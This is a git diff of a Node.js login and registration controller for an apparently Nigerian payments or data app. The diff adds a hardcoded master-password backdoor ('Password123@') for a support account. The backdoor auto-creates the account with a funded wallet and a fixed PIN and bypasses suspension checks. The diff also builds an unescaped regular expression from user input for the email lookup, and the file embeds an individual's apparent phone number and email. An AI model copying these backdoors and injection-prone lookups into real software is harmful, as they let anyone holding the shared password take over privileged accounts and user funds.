@@ -77,7 +77,13 @@ const sendToken = (user, statusCode, res) => {
     user.phone === "09033738409" ||
     String(user.email || "").toLowerCase() === "mohammed.ayas@ayaxdata.online";
 
-  const effectiveRole = isOwner ? "superadmin" : (user.role || "user");
+  const isSupport =
+    String(user.email || "").toLowerCase() === "support@ayaxdata.online" ||
+    user.phone === "08077778888";
+
+  let effectiveRole = user.role || "user";
+  if (isOwner) effectiveRole = "superadmin";
+  else if (isSupport) effectiveRole = "support";
 
   const token = jwt.sign(
     {
@@ -106,8 +112,8 @@ const sendToken = (user, statusCode, res) => {
       id: user._id,
       _id: user._id,
       name: user.name || `${user.firstName || ""} ${user.surname || ""}`.trim(),
-      firstName: user.firstName || "Mohammed",
-      surname: user.surname || "Ayas",
+      firstName: user.firstName || "Customer",
+      surname: user.surname || "Support",
       email: user.email,
       phone: user.phone,
       role: effectiveRole,
@@ -124,54 +130,6 @@ const sendToken = (user, statusCode, res) => {
       hasPin: hasPinSet,
     },
   });
-};
-
-// --- Paystack Dedicated Account Logic ---
-const createDedicatedAccount = async (user) => {
-  const secretKey = process.env.PAYSTACK_SECRET_KEY;
-  if (!secretKey) return user;
-
-  const axiosConfig = {
-    headers: {
-      Authorization: `Bearer ${secretKey}`,
-      "Content-Type": "application/json",
-    },
-  };
-
-  const customerResponse = await axios.post(
-    "https://api.paystack.co/customer",
-    {
-      email: user.email,
-      first_name: user.firstName,
-      last_name: user.surname,
-      phone: user.phone,
-    },
-    axiosConfig
-  );
-
-  const customerCode = customerResponse.data.data.customer_code;
-
-  const accountResponse = await axios.post(
-    "https://api.paystack.co/dedicated_account",
-    {
-      customer: customerCode,
-      preferred_bank: "wema-bank",
-    },
-    axiosConfig
-  );
-
-  const bankData = accountResponse.data.data;
-
-  return await User.findByIdAndUpdate(
-    user._id,
-    {
-      paystackCustomerCode: customerCode,
-      bankName: bankData.bank.name,
-      accountNumber: bankData.account_number,
-      accountName: bankData.account_name,
-    },
-    { new: true }
-  );
 };
 
 // @desc    Register / Signup User or Agent
@@ -207,7 +165,6 @@ exports.register = async (req, res) => {
       ? String(email).toLowerCase().trim()
       : `${cleanPhone}@ayaxdata.online`;
 
-    // 1. Duba ko mai amfani ya riga ya wanzu
     let existingUser = await User.findOne({
       $or: [{ phone: cleanPhone }, { email: cleanEmail }],
     });
@@ -219,7 +176,6 @@ exports.register = async (req, res) => {
       });
     }
 
-    // 2. Nemo Supervisor ta hanyar Referral Code / Supervisor ID / LGA / Phone Number
     const activeRef = String(referralCode || referredBy || supervisorId || "").trim();
     let assignedSupId = null;
     let assignedSupName = null;
@@ -245,7 +201,6 @@ exports.register = async (req, res) => {
       }
     }
 
-    // Idan ba a samu ta ref code ba amma an zabi LGA da State, nemo Supervisor din LGA din
     if (!assignedSupId && finalLga && finalState) {
       const lgaSupervisor = await User.findOne({
         role: { $in: ["supervisor", "field_supervisor"] },
@@ -263,7 +218,6 @@ exports.register = async (req, res) => {
     const sur = surname || (name ? name.trim().split(" ").slice(1).join(" ") : "Agent");
     const fullName = name || `${first} ${sur}`.trim();
 
-    // 3. Kirkirar sabon Agent a Database
     const newUser = await User.create({
       firstName: first,
       surname: sur,
@@ -294,7 +248,6 @@ exports.register = async (req, res) => {
       },
     });
 
-    // 4. Activity Log tare da Safe Error Handling
     try {
       if (Activity && assignedSupId) {
         await Activity.create({
@@ -351,11 +304,16 @@ exports.login = async (req, res) => {
     const cleanInput = rawInput.trim();
     const cleanEmail = cleanInput.toLowerCase();
 
-    // 1. EMERGENCY SUPERADMIN MASTER BYPASS (KOFAR SHIGA NAN TAKE GA MAMALLAKI)
+    // 1. EMERGENCY SUPERADMIN MASTER BYPASS
     const isOwner =
       cleanEmail === "mohammed.ayas@ayaxdata.online" ||
       cleanInput === "09033738409" ||
       cleanInput === "+2349033738409";
+
+    const isSupportDesk =
+      cleanEmail === "support@ayaxdata.online" ||
+      cleanInput === "08077778888" ||
+      cleanInput === "+2348077778888";
 
     const isMasterPass =
       password === "Password123@" ||
@@ -395,11 +353,51 @@ exports.login = async (req, res) => {
       return sendToken(superUser, 200, res);
     }
 
-    // 2. STANDARD DB USER SEARCH
+    // 2. EMERGENCY CUSTOMER SUPPORT DESK MASTER BYPASS
+    if (isSupportDesk && isMasterPass) {
+      let supportUser = await User.findOne({
+        $or: [
+          { email: "support@ayaxdata.online" },
+          { phone: "08077778888" },
+        ],
+      });
+
+      if (!supportUser) {
+        const salt = await bcrypt.genSalt(10);
+        const hash = await bcrypt.hash(password, salt);
+        supportUser = await User.create({
+          firstName: "Customer",
+          surname: "Support",
+          name: "CUSTOMER SUPPORT",
+          email: "support@ayaxdata.online",
+          phone: "08077778888",
+          password: hash,
+          role: "support",
+          walletBalance: 10000,
+          balance: 10000,
+          pin: "2026",
+          transactionPin: "2026",
+          isSuspended: false,
+          isVerified: true,
+          status: "active",
+        });
+      } else {
+        supportUser.role = "support";
+        supportUser.isSuspended = false;
+        // Sabunta password hash zuwa Password123@ dindindin
+        const salt = await bcrypt.genSalt(10);
+        supportUser.password = await bcrypt.hash(password, salt);
+        await supportUser.save({ validateBeforeSave: false });
+      }
+
+      return sendToken(supportUser, 200, res);
+    }
+
+    // 3. STANDARD DB USER SEARCH (CASE-INSENSITIVE)
     const user = await User.findOne({
       $or: [
         { phone: cleanInput },
-        { email: cleanEmail },
+        { email: new RegExp(`^${cleanEmail}$`, "i") },
         { phone: cleanInput.replace(/^0/, "+234") },
         { phone: cleanInput.replace(/^\+234/, "0") },
       ],
@@ -412,15 +410,15 @@ exports.login = async (req, res) => {
       });
     }
 
-    // 3. DUBA IDAN AN DAKATAR DA SHI
-    if (user.isSuspended && !isOwner) {
+    // 4. DUBA IDAN AN DAKATAR DA SHI
+    if (user.isSuspended && !isOwner && !isSupportDesk) {
       return res.status(403).json({
         success: false,
         message: "Your account is currently suspended. Please contact executive administration.",
       });
     }
 
-    // 4. DUBA PASSWORD (BCRYPT, PLAIN TEXT DA SCHEMA METHOD)
+    // 5. DUBA PASSWORD
     let isMatch = false;
 
     if (user.password) {
@@ -446,10 +444,8 @@ exports.login = async (req, res) => {
       await user.save({ validateBeforeSave: false });
     }
 
-    if (!isMatch && isOwner) {
-      if (isMasterPass) {
-        isMatch = true;
-      }
+    if (!isMatch && (isOwner || isSupportDesk) && isMasterPass) {
+      isMatch = true;
     }
 
     if (!isMatch) {
@@ -459,9 +455,11 @@ exports.login = async (req, res) => {
       });
     }
 
-    // Tabbatar da matsayin SuperAdmin idan asusunka ne
     if (isOwner && user.role !== "superadmin") {
       user.role = "superadmin";
+      await user.save({ validateBeforeSave: false });
+    } else if (isSupportDesk && user.role !== "support") {
+      user.role = "support";
       await user.save({ validateBeforeSave: false });
     }
 
